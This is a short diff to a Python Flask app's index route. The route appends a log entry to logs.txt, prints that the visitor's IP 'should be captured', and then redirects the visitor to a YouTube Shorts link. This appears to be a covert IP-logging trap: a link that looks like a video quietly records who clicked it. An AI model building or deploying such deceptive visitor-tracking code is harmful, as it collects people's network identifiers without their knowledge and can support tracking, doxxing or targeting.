@@ -42,11 +42,10 @@ def index():
     with open("logs.txt", "a") as file:
         file.write(log_entry + "\n")
 
-        print(log_entry)
-
-
+    print(log_entry)
     print("🔍 Route executed — IP should be captured")
 
+    return redirect("https://youtube.com/shorts/9DegrMijHiQ?si=TH1nYJGltNQxbpbq")
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
